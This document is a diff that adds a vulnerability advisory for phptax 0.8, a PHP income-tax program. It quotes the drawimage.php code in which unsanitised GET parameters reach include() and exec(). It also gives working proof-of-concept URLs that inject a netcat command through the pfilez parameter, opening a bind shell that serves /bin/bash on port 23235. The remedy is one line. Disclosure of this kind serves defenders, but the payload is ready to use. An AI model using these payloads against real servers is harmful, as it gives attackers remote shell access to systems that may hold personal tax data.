@@ -1,0 +1,51 @@
+-----------------------------------------------------
+phptax 0.8 <= Remote Code Execution Vulnerability
+-----------------------------------------------------
+
+Discovered by: Jean Pascal Pereira <pereira@secbiz.de>
+
+Vendor information:
+
+"PhpTax is free software to do your U.S. income taxes. Tested under Unix environment.
+The program generates .pdfs that can be printed and sent to the IRS. See homepage for details and screenshot."
+
+Vendor URI: http://sourceforge.net/projects/phptax/
+
+----------------------------------------------------
+
+Risk-level: High
+
+The application is prone to a remote code execution vulnerability.
+
+----------------------------------------------------
+
+drawimage.php, line 63:
+
+include ("./files/$_GET[pfilez]");
+
+// makes a png image
+$pfilef=str_replace(".tob",".png",$_GET[pfilez]);
+$pfilep=str_replace(".tob",".pdf",$_GET[pfilez]);
+Header("Content-type: image/png");
+if ($_GET[pdf] == "") Imagepng($image);
+if ($_GET[pdf] == "make") Imagepng($image,"./data/pdf/$pfilef");
+if ($_GET[pdf] == "make") exec("convert ./data/pdf/$pfilef ./data/pdf/$pfilep");
+
+----------------------------------------------------
+
+Exploit / Proof of Concept:
+
+Bindshell on port 23235 using netcat:
+
+http://localhost/phptax/drawimage.php?pfilez=xxx;%20nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&pdf=make
+
+** Exploit-DB Verified:**
+http://localhost/phptax/index.php?pfilez=1040d1-pg2.tob;nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&pdf=make
+
+----------------------------------------------------
+
+Solution:
+
+Do some input validation.
+
+----------------------------------------------------
